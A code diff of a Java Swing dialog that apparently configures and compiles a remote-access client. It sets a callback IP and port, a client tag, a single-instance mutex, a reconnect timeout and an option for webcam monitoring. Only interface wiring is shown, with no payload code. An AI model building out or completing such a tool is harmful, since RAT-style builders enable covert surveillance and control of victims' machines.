@@ -1,16 +1,9 @@
 package GUI.Compiler;
 
-import com.formdev.flatlaf.FlatDarkLaf;
-
 import javax.swing.*;
-import javax.swing.filechooser.FileNameExtensionFilter;
-import javax.swing.plaf.FileChooserUI;
-import javax.swing.plaf.basic.BasicFileChooserUI;
+
 import java.awt.*;
-import java.awt.event.ActionEvent;
-import java.awt.event.ActionListener;
-import java.beans.PropertyChangeEvent;
-import java.beans.PropertyChangeListener;
+
 import java.io.File;
 
 
@@ -23,8 +16,8 @@ public class CompilerGUI {
 
     private JCheckBox webcamCheckBox;
 
-    public CompilerGUI() {
-        compilerDialog = new JDialog();
+    public CompilerGUI(JFrame parentFrame) {
+        compilerDialog = new JDialog(parentFrame,"Compiler");
         compilerDialog.setModal(true);
         compilerDialog.setSize(450, 275);
         compilerDialog.setLocationRelativeTo(null);
@@ -110,30 +103,27 @@ public class CompilerGUI {
         compilerComboBox.addItem(defaultCompiler);
         compilerComboBox.addItem("Select custom path");
 
-        JTextField compilerNameField = new JTextField("g++");
-        compilerNameField.setEditable(false);
-        compilerNameField.setBounds(190, 40, 125, 25);
-        compilePanel.add(compilerNameField);
-        compilerComboBox.addActionListener(new ActionListener() {
-            @Override
-            public void actionPerformed(ActionEvent e) {
-                String selectedItem = (String) compilerComboBox.getSelectedItem();
-                compileButton.setEnabled(false);
-                if (selectedItem != null && !selectedItem.equals(defaultCompiler)) {
-                    JFileChooser fc = new JFileChooser();
-                    fc.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
-                    int returnVal = fc.showSaveDialog(compilerDialog);
-                    if (returnVal == JFileChooser.APPROVE_OPTION) {
-                        File selectedFolder = fc.getSelectedFile();
-                        compilerNameField.setText(selectedFolder.toString() + "\\g++");
-                    } else {
-                        compilerComboBox.setSelectedIndex(0);
-                    }
+        JTextField compilerPathField = new JTextField("g++");
+        compilerPathField.setEditable(false);
+        compilerPathField.setBounds(190, 40, 125, 25);
+        compilePanel.add(compilerPathField);
+        compilerComboBox.addActionListener(e -> {
+            String selectedItem = (String) compilerComboBox.getSelectedItem();
+            compileButton.setEnabled(false);
+            if (selectedItem != null && !selectedItem.equals(defaultCompiler)) {
+                JFileChooser fc = new JFileChooser();
+                fc.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
+                int returnVal = fc.showSaveDialog(compilerDialog);
+                if (returnVal == JFileChooser.APPROVE_OPTION) {
+                    File selectedFolder = fc.getSelectedFile();
+                    compilerPathField.setText(selectedFolder.toString() + "\\g++");
                 } else {
-                    compilerNameField.setText("g++");
+                    compilerComboBox.setSelectedIndex(0);
                 }
-
+            } else {
+                compilerPathField.setText("g++");
             }
+
         });
         compilerComboBox.setBounds(10, 40, 175, 25);
         compilePanel.add(compilerComboBox);
@@ -142,7 +132,9 @@ public class CompilerGUI {
         compileButton.setVisible(false);
         compileButton.setCursor(handCursor);
         compileButton.setBackground(new Color(0, 136, 6));
-        compileButton.addActionListener(new Compiler(compilerDialog, new JCheckBox[]{webcamCheckBox, null}, compilerNameField));
+        compileButton.addActionListener(new Compiler(compilerDialog,
+                new JCheckBox[]{webcamCheckBox, null},
+                new JTextField[]{ipField,portField,tagField,mutexField,timingField,compilerPathField}));
         compileButton.setToolTipText("You must check the version you have " +
                 "installed on your system using the g++ check button");
         compileButton.setEnabled(false);
@@ -150,7 +142,7 @@ public class CompilerGUI {
 
         JButton checkButton = new JButton("Check g++");
         checkButton.setBounds(320, 40, 90, 25);
-        checkButton.addActionListener(new VersionChecker(compilerNameField, compilerDialog, compileButton));
+        checkButton.addActionListener(new VersionChecker(compilerPathField, compilerDialog, compileButton));
         compilePanel.add(checkButton);
 
         tabPane.add(compilePanel, "Compiler");
@@ -172,7 +164,6 @@ public class CompilerGUI {
     private void addMonitorPanel() {
         JPanel monitorPanel = new JPanel();
         monitorPanel.setLayout(null);
-
         webcamCheckBox = new JCheckBox("Enable webcam monitoring");
         webcamCheckBox.setBounds(10, 10, 210, 20);
         monitorPanel.add(webcamCheckBox);
@@ -198,20 +189,24 @@ public class CompilerGUI {
         installationPanel.add(tagLabel);
         tabPane.add(installationPanel, "Installation");
 
-
     }
 
+
+    private JTextField ipField;
+    private JTextField portField;
+    private JTextField mutexField;
+    private JTextField tagField;
+    private JTextField timingField;
     private void addIdentificationPanel() {
 
         JPanel identificationPanel = new JPanel();
-
         identificationPanel.setLayout(null);
 
 
         JLabel tagLabel = new JLabel("Client tag for connection identification:");
         tagLabel.setBounds(10, 10, 210, 20);
         identificationPanel.add(tagLabel);
-        JTextField tagField = new JTextField("Client 1");
+        tagField = new JTextField("Client 1");
         tagField.setBounds(225, 11, 190, 20);
         tagField.addFocusListener(new FieldListener(tagField, "Client 1"));
         identificationPanel.add(tagField);
@@ -224,7 +219,7 @@ public class CompilerGUI {
         JLabel mutexLabel = new JLabel("Mutex is used to avoid executing the same client multiple times.");
         mutexLabel.setBounds(10, 40, 400, 20);
         identificationPanel.add(mutexLabel);
-        JTextField mutexField = new JTextField(Mutex.generateMutex());
+        mutexField = new JTextField(Mutex.generateMutex());
         mutexField.setBounds(10, 70, 250, 20);
         identificationPanel.add(mutexField);
 
@@ -236,16 +231,20 @@ public class CompilerGUI {
         JLabel ipLabel = new JLabel("IP/Hostname:");
         ipLabel.setBounds(10, 110, 100, 20);
         identificationPanel.add(ipLabel);
-        JTextField ipField = new JTextField("127.0.0.1");
+        String defaultIP = "192.168.1.133";
+        ipField = new JTextField(defaultIP);
         ipField.setBounds(90, 110, 100, 20);
+        ipField.addFocusListener(new FieldListener(ipField,defaultIP));
         identificationPanel.add(ipField);
 
 
         JLabel portLabel = new JLabel("PORT:");
         portLabel.setBounds(50, 140, 50, 20);
         identificationPanel.add(portLabel);
-        JTextField portField = new JTextField("4444");
+        String defaultPort = "3055";
+        portField = new JTextField(defaultPort);
         portField.setBounds(90, 140, 50, 20);
+        portField.addFocusListener(new FieldListener(portField,defaultPort));
         identificationPanel.add(portField);
 
         JSeparator vertical = new JSeparator();
@@ -257,8 +256,10 @@ public class CompilerGUI {
         JLabel timingLabel = new JLabel("Timeout to retry connection:");
         timingLabel.setBounds(210, 110, 250, 20);
         identificationPanel.add(timingLabel);
-        JTextField timingField = new JTextField("10000");
+        String defaultTime = "10000";
+        timingField = new JTextField(defaultTime);
         timingField.setBounds(212, 140, 80, 20);
+        timingField.addFocusListener(new FieldListener(timingField,defaultTime));
         identificationPanel.add(timingField);
         JLabel uniteLabel = new JLabel("ms");
         uniteLabel.setBounds(295, 140, 30, 20);
